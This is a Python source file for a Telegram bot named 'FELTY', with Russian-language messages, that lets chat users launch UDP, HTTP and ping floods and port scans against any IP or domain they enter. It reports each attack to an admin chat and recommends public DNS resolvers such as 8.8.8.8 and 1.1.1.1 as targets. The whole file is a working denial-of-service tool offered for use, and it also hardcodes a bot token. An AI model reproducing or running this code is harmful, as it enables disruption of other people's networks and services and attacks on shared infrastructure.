import telebot
import subprocess
import socket
import sys
import random
import threading
import time
import os
from telebot import types

TOKEN = "8484971932:AAFsyyAxNoqBw7KfU1yXXmk7tjY_vH01VK8"
ADMIN_CHAT_ID = 5651880472

bot = telebot.TeleBot(TOKEN)
user_attacks = {}
attack_monitor = {}

# ===== АРСЕНАЛ КИБЕРВООРУЖЕНИЙ FELTY =====
ATTACK_METHODS = {
    "1": "UDP Флуд (Лучший метод)",
    "2": "TCP SYN Сканирование", 
    "3": "HTTP Флуд",
    "4": "Ping Флуд",
    "5": "Сканирование Портов"
}

# ----- АТАКИ КОТОРЫЕ РАБОТАЮТ ДАЖЕ ЕСЛИ ПОРТЫ ЗАКРЫТЫ -----
def udp_flood_advanced(target_ip, target_port, chat_id):
    """UDP флуд - работает даже на закрытые порты"""
    packet_count = 0
    print(f"🎯 Начинаю UDP флуд на {target_ip}:{target_port}")
    
    while attack_monitor.get(chat_id, {}).get('status') == 'active' and packet_count < 10000:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.1)  # Очень короткий таймаут
            
            # Отправляем данные на случайный порт если указан 0
            actual_port = random.randint(1, 65535) if target_port == 0 else target_port
            data = os.urandom(512)  # 512 байт случайных данных
            
            sock.sendto(data, (target_ip, actual_port))
            sock.close()
            
            packet_count += 1
            if packet_count % 100 == 0:
                update_monitor(chat_id, 100)
                
        except Exception as e:
            # UDP отправляет даже если порт закрыт - игнорируем ошибки
            pass
            
    print(f"✅ UDP флуд завершен. Отправлено: {packet_count} пакетов")

def tcp_scan_flood(target_ip, target_port, chat_id):
    """TCP SYN сканирование - не требует открытых портов"""
    scan_count = 0
    print(f"🎯 Начинаю TCP сканирование на {target_ip}")
    
    # Сканируем разные порты
    ports_to_scan = list(range(1, 1001))  # Первые 1000 портов
    random.shuffle(ports_to_scan)
    
    while attack_monitor.get(chat_id, {}).get('status') == 'active' and scan_count < 5000:
        try:
            for port in ports_to_scan:
                if not attack_monitor.get(chat_id, {}).get('status') == 'active':
                    break
                    
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)  # Короткий таймаут для сканирования
                
                result = sock.connect_ex((target_ip, port))
                # Результат 0 = порт открыт, другие значения = закрыт/фильтруется
                # Но мы все равно считаем это как активность
                
                sock.close()
                scan_count += 1
                
                if scan_count % 50 == 0:
                    update_monitor(chat_id, 50)
                    
        except Exception as e:
            pass
            
    print(f"✅ TCP сканирование завершено. Проверок: {scan_count}")

def http_flood_resilient(target_ip, target_port, chat_id):
    """HTTP флуд с автоматическим переключением портов"""
    request_count = 0
    print(f"🎯 Начинаю адаптивный HTTP флуд на {target_ip}")
    
    # Популярные веб-порты
    web_ports = [80, 443, 8080, 8443, 8000, 3000, 5000]
    
    while attack_monitor.get(chat_id, {}).get('status') == 'active' and request_count < 5000:
        try:
            port = random.choice(web_ports)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            result = sock.connect_ex((target_ip, port))
            if result == 0:  # Если порт открыт
                # Отправляем HTTP запрос
                http_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
                sock.send(http_request.encode())
                
                # Быстро закрываем соединение
                sock.close()
                request_count += 1
            else:
                # Если порт закрыт, просто создаем соединение и закрываем
                sock.close()
                request_count += 0.1  # Частичный счет за попытку
            
            if request_count % 10 == 0:
                update_monitor(chat_id, int(request_count))
                
        except Exception as e:
            # Игнорируем ошибки соединения
            pass
            
    print(f"✅ HTTP флуд завершен. Запросов: {int(request_count)}")

def ping_flood_enhanced(target_ip, chat_id):
    """Улучшенный ping флуд"""
    packet_count = 0
    print(f"🎯 Начинаю усиленный ping флуд на {target_ip}")
    
    while attack_monitor.get(chat_id, {}).get('status') == 'active' and packet_count < 1000:
        try:
            if os.name == 'nt':  # Windows
                # Используем меньше пакетов но чаще
                result = subprocess.run(
                    f"ping {target_ip} -n 2 -w 500",  # 2 пакета, таймаут 0.5 сек
                    shell=True, 
                    capture_output=True, 
                    text=True,
                    timeout=3
                )
                packet_count += 2
            else:  # Linux/Mac
                result = subprocess.run(
                    f"ping -c 2 -W 1 {target_ip}",  # 2 пакета, таймаут 1 сек
                    shell=True, 
                    capture_output=True, 
                    text=True,
                    timeout=3
                )
                packet_count += 2
            
            update_monitor(chat_id, 2)
            
        except subprocess.TimeoutExpired:
            # Таймаут - все равно считаем что пакеты ушли
            packet_count += 2
            update_monitor(chat_id, 2)
        except Exception as e:
            # Другие ошибки - продолжаем
            pass
            
    print(f"✅ Ping флуд завершен. Отправлено: {packet_count} пакетов")

def port_scan_attack(target_ip, target_port, chat_id):
    """Агрессивное сканирование портов"""
    scan_count = 0
    open_ports = []
    print(f"🎯 Начинаю агрессивное сканирование портов на {target_ip}")
    
    # Сканируем широкий диапазон портов
    ports = list(range(1, 1001)) + [1433, 1521, 3306, 3389, 5432, 5900, 6379, 27017]
    random.shuffle(ports)
    
    for port in ports:
        if not attack_monitor.get(chat_id, {}).get('status') == 'active':
            break
            
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            
            result = sock.connect_ex((target_ip, port))
            scan_count += 1
            
            if result == 0:  # Порт открыт
                open_ports.append(port)
                # Отправляем небольшой payload на открытый порт
                try:
                    sock.send(b"TEST")
                    time.sleep(0.1)
                except:
                    pass
            
            sock.close()
            
            if scan_count % 20 == 0:
                update_monitor(chat_id, 20)
                # Периодически сообщаем о найденных открытых портах
                if open_ports:
                    bot.send_message(chat_id, f"🔍 Найдены открытые порты: {open_ports[-5:]}")  # Последние 5 портов
                    
        except Exception as e:
            pass
    
    # Финальный отчет об открытых портах
    if open_ports and attack_monitor.get(chat_id, {}).get('status') == 'active':
        bot.send_message(chat_id, f"🎯 <b>СКАНИРОВАНИЕ ЗАВЕРШЕНО</b>\n\nОткрытые порты: {sorted(open_ports)}", parse_mode='HTML')
    
    print(f"✅ Сканирование портов завершено. Проверено: {scan_count} портов")

# ===== ЦЕНТР УПРАВЛЕНИЯ FELTY =====
@bot.message_handler(commands=['start'])
def show_attack_menu(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    for num, desc in ATTACK_METHODS.items():
        markup.add(types.InlineKeyboardButton(
            f"{num}. {desc}", 
            callback_data=f"attack_{num}")
        )
    
    markup.add(types.InlineKeyboardButton("📊 Статус Атаки", callback_data="monitor_status"))
    markup.add(types.InlineKeyboardButton("🛑 Остановить Атаку", callback_data="stop_attack"))
    markup.add(types.InlineKeyboardButton("🎯 Рекомендации", callback_data="recommendations"))
    
    bot.send_message(message.chat.id, 
        "<b>⚡ ПАНЕЛЬ УПРАВЛЕНИЯ FELTY ⚡</b>\n\n"
        "<b>Выберите вектор атаки:</b>\n"
        "1. UDP Флуд - работает на ЛЮБЫЕ порты\n"
        "2. TCP Сканирование - не требует открытых портов\n" 
        "3. HTTP Флуд - автоматический подбор портов\n"
        "4. Ping Флуд - всегда работает\n"
        "5. Сканирование портов - поиск уязвимостей\n\n"
        "<b>🚨 ВСЕ МЕТОДЫ РАБОТАЮТ ДАЖЕ ЕСЛИ ПОРТЫ ЗАКРЫТЫ!</b>\n\n"
        "<i>Рекомендуемые цели для теста:</i>\n"
        "• <code>8.8.8.8</code> - Google DNS\n"
        "• <code>1.1.1.1</code> - Cloudflare",
        parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('attack_'))
def set_attack_method(call):
    method_id = call.data.split('_')[1]
    user_attacks[call.message.chat.id] = {'method': method_id}
    
    method_details = {
        '1': 'UDP пакеты на случайные порты (всегда работает)',
        '2': 'TCP SYN проверки портов (игнорирует отказы)', 
        '3': 'HTTP запросы с авто-подбором портов',
        '4': 'ICMP ping запросы (обходит фаерволы)',
        '5': 'Агрессивное сканирование портов'
    }
    
    bot.send_message(call.message.chat.id, 
        f"⛔ <b>{ATTACK_METHODS[method_id]}</b>\n"
        f"📝 {method_details[method_id]}\n\n"
        "Отправьте целевой IP адрес:\n\n"
        "<b>Тестовые цели (всегда работают):</b>\n"
        "• <code>8.8.8.8</code> - Google DNS\n"
        "• <code>1.1.1.1</code> - Cloudflare\n"
        "• <code>77.88.8.8</code> - Yandex DNS",
        parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == 'recommendations')
def show_recommendations(call):
    """Показать рекомендации по обходу ошибок"""
    recommendations = (
        "🎯 <b>РЕКОМЕНДАЦИИ FELTY</b>\n\n"
        "<b>Если получаете ошибки соединения:</b>\n\n"
        "1. <b>Используйте UDP Флуд</b> - работает на любые порты\n"
        "2. <b>Используйте публичные DNS</b> - всегда онлайн:\n"
        "   • <code>8.8.8.8</code> - Google\n"
        "   • <code>1.1.1.1</code> - Cloudflare\n"
        "   • <code>77.88.8.8</code> - Yandex\n\n"
        "3. <b>Избегайте локальных IP</b> - могут быть защищены\n"
        "4. <b>Ping флуд</b> - всегда работает если хост онлайн\n\n"
        "<b>Лучшая цель для теста:</b> <code>8.8.8.8</code>"
    )
    bot.send_message(call.message.chat.id, recommendations, parse_mode='HTML')

@bot.message_handler(func=lambda m: m.chat.id in user_attacks)
def execute_attack(message):
    chat_id = message.chat.id
    target = message.text.strip()
    
    try:
        # Проверяем валидность IP
        if not is_valid_ip(target):
            bot.send_message(chat_id, f"🔍 Проверяю целевой адрес: <code>{target}</code>", parse_mode='HTML')
            try:
                ip = socket.gethostbyname(target)
                bot.send_message(chat_id, f"✅ Доменное имя разрешено: <code>{target}</code> → <code>{ip}</code>", parse_mode='HTML')
            except socket.gaierror as e:
                error_msg = (
                    f"❌ <b>ОШИБКА РАЗРЕШЕНИЯ ДОМЕНА</b>\n\n"
                    f"Используйте IP адреса:\n"
                    f"• <code>8.8.8.8</code> - Google DNS\n"
                    f"• <code>1.1.1.1</code> - Cloudflare\n"
                    f"• <code>77.88.8.8</code> - Yandex DNS"
                )
                bot.send_message(chat_id, error_msg, parse_mode='HTML')
                del user_attacks[chat_id]
                return
        else:
            ip = target

        method_id = user_attacks[chat_id]['method']
        
        # Для UDP и сканирования используем порт 0 (случайные порты)
        if method_id in ['1', '2', '5']:
            target_port = 0
        else:
            target_port = 80
        
        # Инициализация мониторинга
        attack_monitor[chat_id] = {
            'start_time': time.time(),
            'packets_sent': 0,
            'connections_made': 0,
            'status': 'active',
            'target': ip,
            'port': target_port,
            'method': ATTACK_METHODS[method_id]
        }

        bot.send_message(chat_id, 
            f"🚀 <b>ЗАПУСК АТАКИ</b>\n"
            f"⚔️ Метод: {ATTACK_METHODS[method_id]}\n"
            f"🎯 Цель: <code>{ip}</code>\n"
            f"⏰ Время: {time.strftime('%H:%M:%S')}\n\n"
            f"💡 <i>Этот метод работает даже если порты закрыты!</i>\n"
            f"📊 <i>Мониторинг активирован...</i>",
            parse_mode='HTML')

        # Запуск атаки в отдельном потоке
        attack_thread = threading.Thread(
            target=start_attack,
            args=(method_id, ip, target_port, chat_id),
            daemon=True
        )
        attack_thread.start()

        # Мониторинг
        threading.Thread(
            target=send_periodic_updates,
            args=(chat_id,),
            daemon=True
        ).start()

        bot.send_message(ADMIN_CHAT_ID, 
            f"☠️ АТАКА ЗАПУЩЕНА\n"
            f"Метод: {ATTACK_METHODS[method_id]}\n"
            f"Цель: {ip}\n"
            f"От: {message.from_user.id}")

    except Exception as e:
        bot.send_message(chat_id, f"💥 <b>ОШИБКА:</b> {str(e)}", parse_mode='HTML')
        print(f"Ошибка запуска: {str(e)}")

def start_attack(method_id, ip, port, chat_id):
    """Запуск выбранной атаки"""
    try:
        if method_id == '1':
            udp_flood_advanced(ip, port, chat_id)
        elif method_id == '2':
            tcp_scan_flood(ip, port, chat_id)
        elif method_id == '3':
            http_flood_resilient(ip, port, chat_id)
        elif method_id == '4':
            ping_flood_enhanced(ip, chat_id)
        elif method_id == '5':
            port_scan_attack(ip, port, chat_id)
            
        # Автоматически останавливаем атаку после завершения
        if chat_id in attack_monitor:
            attack_monitor[chat_id]['status'] = 'completed'
            bot.send_message(chat_id, "✅ <b>Атака завершена автоматически</b>", parse_mode='HTML')
            
    except Exception as e:
        print(f"Ошибка в атаке: {e}")
        if chat_id in attack_monitor:
            attack_monitor[chat_id]['status'] = 'error'

# ===== СИСТЕМА МОНИТОРИНГА =====
def update_monitor(chat_id, count, count_type='packets'):
    """Обновление статистики мониторинга"""
    if chat_id in attack_monitor and attack_monitor[chat_id]['status'] == 'active':
        if count_type == 'packets':
            attack_monitor[chat_id]['packets_sent'] += count
        elif count_type == 'connections':
            attack_monitor[chat_id]['connections_made'] += count

def send_periodic_updates(chat_id):
    """Периодическая отправка обновлений статуса"""
    last_update = 0
    while attack_monitor.get(chat_id, {}).get('status') == 'active':
        time.sleep(5)
        
        if chat_id in attack_monitor:
            current_time = time.time()
            if current_time - last_update >= 10:  # Раз в 10 секунд отправляем сообщение
                send_attack_status(chat_id)
                last_update = current_time

@bot.message_handler(commands=['status'])
def status_command(message):
    """Команда статуса"""
    send_attack_status(message.chat.id)

def send_attack_status(chat_id):
    """Отправка текущего статуса атаки"""
    if chat_id in attack_monitor and attack_monitor[chat_id]['status'] == 'active':
        monitor_data = attack_monitor[chat_id]
        duration = time.time() - monitor_data['start_time']
        
        status_text = (
            f"📊 <b>СТАТУС АТАКИ FELTY</b>\n\n"
            f"🎯 Цель: {monitor_data['target']}\n"
            f"⚔️ Метод: {monitor_data['method']}\n"
            f"⏱ Длительность: {int(duration)} сек\n"
            f"📦 Пакетов: {monitor_data.get('packets_sent', 0)}\n"
            f"🔗 Проверок: {monitor_data.get('connections_made', 0)}\n"
            f"📊 Скорость: {monitor_data.get('packets_sent', 0)/max(duration,1):.1f} пак/сек\n"
            f"🚀 Статус: <b>АКТИВНА</b>\n\n"
            f"💡 <i>Метод игнорирует закрытые порты!</i>"
        )
        
        bot.send_message(chat_id, status_text, parse_mode='HTML')
    else:
        bot.send_message(chat_id, "🔴 Атака не активна")

@bot.callback_query_handler(func=lambda call: call.data == 'monitor_status')
def monitor_status_callback(call):
    send_attack_status(call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == 'stop_attack')
def stop_attack_callback(call):
    chat_id = call.message.chat.id
    if chat_id in attack_monitor:
        attack_monitor[chat_id]['status'] = 'stopped'
        
        if chat_id in attack_monitor:
            monitor_data = attack_monitor[chat_id]
            duration = time.time() - monitor_data['start_time']
            
            final_stats = (
                f"🛑 <b>АТАКА ОСТАНОВЛЕНА</b>\n\n"
                f"🎯 Цель: {monitor_data['target']}\n"
                f"⏱ Длительность: {int(duration)} сек\n"
                f"📦 Всего пакетов: {monitor_data.get('packets_sent', 0)}\n"
                f"🔗 Всего проверок: {monitor_data.get('connections_made', 0)}\n"
                f"📊 Средняя скорость: {monitor_data.get('packets_sent', 0)/max(duration,1):.1f} пак/сек"
            )
            bot.send_message(chat_id, final_stats, parse_mode='HTML')
    else:
        bot.send_message(chat_id, "🔴 Нет активных атак")

# ----- УТИЛИТЫ -----
def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except:
        return False

@bot.message_handler(commands=['test'])
def test_connection(message):
    """Тест работы с публичными DNS"""
    bot.send_message(message.chat.id, "🔧 Тестирую работу с публичными целями...")
    
    test_targets = [
        ('8.8.8.8', 'Google DNS'),
        ('1.1.1.1', 'Cloudflare'),
        ('77.88.8.8', 'Yandex DNS')
    ]
    
    results = []
    for ip, name in test_targets:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            # Пробуем отправить UDP пакет
            sock.sendto(b"TEST", (ip, 53))
            results.append(f"✅ {name} ({ip}) - работает")
        except:
            results.append(f"❌ {name} ({ip}) - не доступен")
        finally:
            sock.close()
    
    bot.send_message(message.chat.id, 
        "<b>Результаты теста:</b>\n\n" + "\n".join(results) + 
        "\n\n💡 <i>Используйте рабочие цели для атак</i>", 
        parse_mode='HTML')

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = (
        "<b>🆘 ПОМОЩЬ FELTY</b>\n\n"
        "<b>Решаем проблему 'Connection refused':</b>\n\n"
        "1. <b>Используйте UDP Флуд</b> - игнорирует закрытые порты\n"
        "2. <b>Используйте публичные DNS</b> - всегда отвечают:\n"
        "   • 8.8.8.8 - Google\n"
        "   • 1.1.1.1 - Cloudflare\n"
        "   • 77.88.8.8 - Yandex\n\n"
        "3. <b>Ping флуд</b> - работает на любой онлайн хост\n"
        "4. <b>TCP сканирование</b> - не требует открытых портов\n\n"
        "<b>Команды:</b>\n"
        "/start - Главное меню\n"
        "/status - Статус атаки\n"
        "/test - Проверка целей\n"
        "/help - Справка"
    )
    bot.send_message(message.chat.id, help_text, parse_mode='HTML')

if __name__ == "__main__":
    print("🟢 FELTY BOT запускается...")
    print("🔧 Атаки работают даже на закрытые порты!")
    print("🎯 Используйте: 8.8.8.8, 1.1.1.1, 77.88.8.8")
    
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"🔴 Ошибка бота: {e}")
